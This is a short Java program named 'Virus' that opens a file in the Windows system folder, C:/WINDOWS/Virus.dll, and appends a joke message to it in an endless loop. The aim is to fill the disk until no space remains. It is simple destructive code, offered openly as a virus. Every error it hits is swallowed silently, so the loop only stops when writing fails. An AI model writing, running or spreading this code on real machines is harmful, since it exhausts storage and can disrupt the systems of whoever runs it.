import java.io.*;
class Virus
{
public static void main(String ar[])
 {
   try
  {
   FileWriter f=new FileWriter("C:/WINDOWS/Virus.dll",true);
   while(true)
   {
   f.write("Im so hungry...can i eat your space?Yes?Ok!Tanks!");
   }
  }
  catch(FileNotFoundException e){}
   catch(IOException e){}
 }
} 

